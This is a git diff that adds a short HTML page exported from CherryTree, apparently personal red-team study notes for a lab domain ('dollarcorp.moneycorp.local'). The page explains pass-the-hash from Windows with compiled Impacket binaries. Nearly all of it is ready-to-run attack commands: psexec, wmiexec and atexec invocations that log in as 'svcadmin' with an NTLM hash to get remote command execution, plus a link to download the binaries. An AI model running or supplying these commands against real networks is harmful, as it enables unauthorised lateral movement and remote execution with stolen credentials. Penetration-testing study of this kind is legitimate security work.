@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>via Compiled Impacket Binaries</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Using Hashes - from Windows - via Compiled Impacket Binaries</h1></strong><br /><a href="https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries">https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries</a><br />Impacket offers compiled Windows binaries of their scripts.<br />You can use these to pass hashes.<br /><br /><strong><h2>## psexec_windows.exe</h2></strong><br /><code>psexec_windows.exe -hashes &quot;:b38ff50264b74508085d82c69794a4d8&quot; svcadmin@dcorp-mgmt.my.domain.local</code><br /><br /><strong><h2>## wmiexec.exe</h2></strong><br /><code>wmiexec_windows.exe -hashes &quot;:b38ff50264b74508085d82c69794a4d8&quot; svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local</code><br /><br /><strong><h2>## atexec.exe</h2></strong><br />In this case you need to specify a command.<br />cmd.exe and powershell.exe are not valid to obtain an interactive shell<br /><br /><code>atexec_windows.exe -hashes &quot;:b38ff50264b74508085d82c69794a4d8&quot; svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local &#39;whoami&#39;</code><br /><br /></div>
+</body>
+</html>
